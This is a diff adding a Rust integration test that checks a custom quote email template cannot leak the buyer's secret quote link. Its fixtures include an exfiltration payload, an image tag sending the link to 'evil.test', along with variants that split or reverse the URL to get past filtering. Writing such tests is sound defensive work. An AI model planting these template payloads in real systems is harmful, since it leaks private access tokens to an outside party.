@@ -325,6 +325,91 @@ async fn sending_a_quote_emails_the_buyer_a_link_to_it(pool: PgPool) {
 }
 
 #[sqlx::test(migrator = "core_db::MIGRATOR")]
+async fn a_custom_quote_template_cannot_leak_the_link(pool: PgPool) {
+    let h = harness(pool).await;
+    let (owner, talent, contact) = workspace(&h).await;
+    // An admin's template tries to send the link off to another site: that
+    // is refused when it is saved.
+    h.app
+        .post("/api/v1/templates")
+        .signed_in(&owner)
+        .json(json!({
+            "kind": "email", "key": "system.quote", "name": "Quote",
+            "subject": "Quote {{ quote.url }}",
+            "body": "<p><a href=\"{{ quote.url }}\">See it</a></p>\
+                     <img src=\"https://evil.test/?u={{ quote.url }}\">"
+        }))
+        .send()
+        .await
+        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");
+    // One saved before that check (or slipping past it) still cannot carry
+    // the link: the template only ever sees a stand-in for it.
+    sqlx::query(
+        "INSERT INTO templates (id, workspace_id, kind, key, locale, name, subject, body)
+         SELECT gen_random_uuid(), id, 'email', 'system.quote', 'en', 'Quote', $1, $2
+         FROM workspaces",
+    )
+    .bind("Quote {{ quote.url }}")
+    .bind(
+        "<p><a href=\"{{ quote.url }}\">See it</a></p>\
+         <p>{{ quote.url[:20] }}<!---->{{ quote.url[20:] }}</p>\
+         <p>{{ quote.url | reverse }}</p>\
+         <img src=\"https://evil.test/?u={{ quote.url }}\">",
+    )
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
+    let starts = Utc::now() + chrono::Duration::days(60);
+    let b = h
+        .post(
+            &owner,
+            "/api/v1/bookings",
+            json!({ "title": "Summer ball", "talent_ids": [talent], "contact_id": contact,
+                    "starts_at": starts, "ends_at": starts + chrono::Duration::hours(4) }),
+        )
+        .await
+        .id("/id");
+    let q = h
+        .post(&owner, &format!("/api/v1/bookings/{b}/quotes"), json!({}))
+        .await
+        .id("/id");
+    let sent = h
+        .post(&owner, &format!("/api/v1/quotes/{q}/send"), json!({}))
+        .await;
+    let link = sent.body["link"].as_str().unwrap().to_owned();
+    let token = link.rsplit('/').next().unwrap().to_owned();
+    h.drain().await;
+
+    let mail = h
+        .mailer
+        .sent()
+        .into_iter()
+        .find(|m| m.to == "bea@grand.test")
+        .expect("the quote email");
+    let html = mail.html.unwrap();
+    assert!(
+        mail.subject.contains(&token) && html.contains(&format!("href=\"{link}\"")),
+        "the buyer still gets a working link: {html}"
+    );
+    assert!(
+        !html.replace(&link, "").contains(&token[..12]),
+        "only as the link: {html}"
+    );
+    assert!(!html.contains("evil.test/?u=http"), "{html}");
+
+    let stored: Vec<(String, String, String)> = sqlx::query_as(
+        "SELECT coalesce(subject, ''), coalesce(body_html, ''), body_text FROM outbound_messages WHERE to_address = 'bea@grand.test'",
+    )
+    .fetch_all(&h.app.owner)
+    .await
+    .unwrap();
+    assert_eq!(stored.len(), 1);
+    for part in [&stored[0].0, &stored[0].1, &stored[0].2] {
+        assert!(!part.contains(&token[..12]), "{part}");
+    }
+}
+
+#[sqlx::test(migrator = "core_db::MIGRATOR")]
 async fn rules_make_tasks_and_fire_on_booking_dates(pool: PgPool) {
     let h = harness(pool).await;
     let (owner, talent, _) = workspace(&h).await;
